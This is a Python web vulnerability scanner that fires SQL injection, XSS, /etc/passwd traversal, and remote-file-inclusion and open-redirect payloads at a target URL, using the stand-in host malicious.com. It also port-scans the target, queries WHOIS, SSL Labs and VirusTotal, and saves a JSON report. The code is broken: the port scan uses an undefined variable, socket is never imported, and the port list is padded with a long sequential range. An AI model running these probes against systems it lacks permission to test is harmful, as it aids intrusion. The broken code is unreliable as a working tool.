import requests
import json
import base64
from urllib.parse import urlparse
import whois
import re

# Configuration for API Keys
API_KEYS = {
    "shodan": "your_shodan_api_key",
    "virustotal": "your_virustotal_api_key",
    "ssl_labs": "your_ssl_labs_api_key",
}

TARGET_URL = 'http://example.com'

def sql_injection_check(target_url):
    """SQL Injection testing with various payloads."""
    payloads = ["' OR '1'='1", "' UNION SELECT null", "' OR 'a'='a"]
    vulnerable = False
    for payload in payloads:
        response = requests.get(target_url, params={"id": payload})
        if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
            vulnerable = True
            print(f"SQL Injection vulnerability detected with payload: {payload}")
    return vulnerable

def xss_check(target_url):
    """Basic XSS testing with common payloads."""
    xss_payloads = ["<script>alert('xss')</script>", "<img src=x onerror=alert('xss')>"]
    vulnerable = False
    for payload in xss_payloads:
        response = requests.get(target_url, params={"input": payload})
        if payload in response.text:
            vulnerable = True
            print(f"XSS vulnerability detected with payload: {payload}")
    return vulnerable

def file_inclusion_check(target_url):
    """Test for LFI and RFI vulnerabilities."""
    paths = ["../../etc/passwd", "http://malicious.com/"]
    vulnerable = False
    for path in paths:
        response = requests.get(target_url, params={"file": path})
        if "root:" in response.text or "malicious" in response.text:
            vulnerable = True
            print(f"File inclusion vulnerability detected with payload: {path}")
    return vulnerable

def directory_traversal_check(target_url):
    """Test for directory traversal vulnerabilities."""
    traversal_payloads = ["../../etc/passwd", "../etc/passwd"]
    vulnerable = False
    for payload in traversal_payloads:
        response = requests.get(target_url, params={"path": payload})
        if "root:" in response.text:
            vulnerable = True
            print(f"Directory traversal vulnerability detected with payload: {payload}")
    return vulnerable

def open_redirect_check(target_url):
    """Test for open redirect vulnerabilities."""
    redirect_payload = "http://malicious.com"
    response = requests.get(target_url, params={"url": redirect_payload})
    if redirect_payload in response.url:
        print("Open Redirect vulnerability detected.")
        return True
    return False

def auth_check(target_url):
    """Detect authentication vulnerabilities (basic check for exposed login forms)."""
    response = requests.get(target_url)
    if "login" in response.text.lower():
        print("Possible authentication endpoint detected.")
        return True
    return False

def server_misconfiguration_check(target_url):
    """Checks for common server misconfigurations."""
    response = requests.get(target_url)
    misconfigurations = {
        "Directory Listing": any(keyword in response.text.lower() for keyword in ["index of", "parent directory"]),
        "Verbose Error Messages": "error" in response.text.lower() and "exception" in response.text.lower()
    }
    for config, found in misconfigurations.items():
        if found:
            print(f"Server misconfiguration detected: {config}")
    return misconfigurations

def whois_info(target_url):
    """Fetches WHOIS information for the domain."""
    domain = urlparse(target_url).netloc
    try:
        whois_data = whois.whois(domain)
        return whois_data
    except Exception as e:
        print(f"Error retrieving WHOIS data: {e}")
    return {}

def port_scan(target_url):
    """Basic port scanning for common ports."""
    domain = urlparse(target_url).netloc
    ports = [1, 3, 7, 9, 13, 17, 19, 20, 21, 22, 23, 25, 26, 37, 53, 69, 79, 80, 88, 101, 106, 110, 111, 113, 119, 123, 135,
        139, 143, 179, 199, 389, 427, 443, 465, 500, 512, 513, 514, 515, 520, 587, 631, 636, 993, 995, 1025, 1026, 1027,
        1028, 1029, 1030, 1433, 1434, 1521, 1589, 1701, 1723, 1755, 1812, 1863, 1900, 2000, 2001, 2049, 2121, 2222,
        2600, 2601, 2602, 2604, 3128, 3306, 3389, 3986, 4899, 5000, 5432, 5555, 5631, 5632, 5900, 5984, 6379, 6665,
        6666, 6667, 6668, 6669, 6881, 6969, 8080, 8081, 8443, 8888, 9090, 9200, 10000, 12345, 27374, 31337, 32768,
        49152, 49153, 49154, 49155, 49156, 49157, 49158, 49159, 49160, 49161, 49162, 49163, 49164, 49165, 49166, 49167,
        49168, 49169, 49170, 49171, 49172, 49173, 49174, 49175, 49176, 49177, 49178, 49179, 49180, 49181, 49182, 49183,
        49184, 49185, 49186, 49187, 49188, 49189, 49190, 49191, 49192, 49193, 49194, 49195, 49196, 49197, 49198, 49199,
        49200, 49201, 49202, 49203, 49204, 49205, 49206, 49207, 49208, 49209, 49210, 49211, 49212, 49213, 49214, 49215,
        49216, 49217, 49218, 49219, 49220, 49221, 49222, 49223, 49224, 49225, 49226, 49227, 49228, 49229, 49230, 49231,
        49232, 49233, 49234, 49235, 49236, 49237, 49238, 49239, 49240, 49241, 49242, 49243, 49244, 49245, 49246, 49247,
        49248, 49249, 49250, 49251, 49252, 49253, 49254, 49255, 49256, 49257, 49258, 49259, 49260, 49261, 49262, 49263,
        49264, 49265, 49266, 49267, 49268, 49269, 49270, 49271, 49272, 49273, 49274, 49275, 49276, 49277, 49278, 49279,
        49280, 49281, 49282, 49283, 49284, 49285, 49286, 49287, 49288, 49289, 49290, 49291, 49292, 49293, 49294, 49295,
        49296, 49297, 49298, 49299, 49300, 49301, 49302, 49303, 49304, 49305, 49306, 49307, 49308, 49309, 49310, 49311,
        49312, 49313, 49314, 49315, 49316, 49317, 49318, 49319, 49320, 49321, 49322, 49323, 49324, 49325, 49326, 49327,
        49328, 49329, 49330, 49331, 49332, 49333, 49334, 49335, 49336, 49337, 49338, 49339, 49340, 49341, 49342, 49343,
        49344, 49345, 49346, 49347, 49348, 49349, 49350, 49351, 49352, 49353, 49354, 49355, 49356, 49357, 49358, 49359,
        49360, 49361, 49362, 49363, 49364, 49365, 49366, 49367, 49368, 49369, 49370, 49371, 49372, 49373, 49374, 49375,
        49376, 49377, 49378, 49379, 49380, 49381, 49382, 49383, 49384, 49385, 49386, 49387, 49388, 49389, 49390, 49391,
        49392, 49393, 49394, 49395, 49396, 49397, 49398, 49399, 49400]  # Common ports
    open_ports = []
    for port in common_ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)  # Shorter timeout for faster scan
            result = sock.connect_ex((domain, port))
            if result == 0:
                open_ports.append(port)
                print(f"Open port detected: {port}")
    
    return open_ports

def ssl_labs_scan(target_url):
    """Uses SSL Labs API to analyze SSL/TLS config of the target domain."""
    domain = urlparse(target_url).netloc
    try:
        ssl_url = f'https://api.ssllabs.com/api/v3/analyze?host={domain}'
        response = requests.get(ssl_url, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"Error in SSL Labs scan: {e}")
    return {}

def virustotal_scan(target_url):
    """Uses VirusTotal API to analyze the URL for malware or phishing."""
    vt_url = f'https://www.virustotal.com/api/v3/urls'
    headers = {"x-apikey": API_KEYS["virustotal"]}
    vt_encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode().strip("=")
    try:
        response = requests.get(f"{vt_url}/{vt_encoded_url}", headers=headers, timeout=10)
        response.raise_for_status()
        return response.json().get('data', {}).get('attributes', {})
    except requests.RequestException as e:
        print(f"Error in VirusTotal scan: {e}")
    return {}

def generate_report(target_url, results):
    """Generates a report summarizing all vulnerability checks."""
    report = {
        "Target URL": target_url,
        "SQL Injection": results["sql_injection"],
        "XSS Vulnerability": results["xss"],
        "File Inclusion": results["file_inclusion"],
        "Directory Traversal": results["directory_traversal"],
        "Open Redirect": results["open_redirect"],
        "Authentication Exposure": results["auth_check"],
        "Server Misconfigurations": results["server_misconfiguration"],
        "WHOIS Info": results["whois_info"],
        "Open Ports": results["port_scan"],
        "SSL Labs Analysis": results["ssl_labs"],
        "VirusTotal Analysis": results["virustotal"]
    }
    with open('comprehensive_vulnerability_report.json', 'w') as f:
        json.dump(report, f, indent=4, default=str)
    print("Report saved as comprehensive_vulnerability_report.json")

def main():
    """Runs all vulnerability checks and generates the report."""
    results = {
        "sql_injection": sql_injection_check(TARGET_URL),
        "xss": xss_check(TARGET_URL),
        "file_inclusion": file_inclusion_check(TARGET_URL),
        "directory_traversal": directory_traversal_check(TARGET_URL),
        "open_redirect": open_redirect_check(TARGET_URL),
        "auth_check": auth_check(TARGET_URL),
        "server_misconfiguration": server_misconfiguration_check(TARGET_URL),
        "whois_info": whois_info(TARGET_URL),
        "port_scan": port_scan(TARGET_URL),
        "ssl_labs": ssl_labs_scan(TARGET_URL),
        "virustotal": virustotal_scan(TARGET_URL)
    }
    generate_report(TARGET_URL, results)

if __name__ == '__main__':
    main()
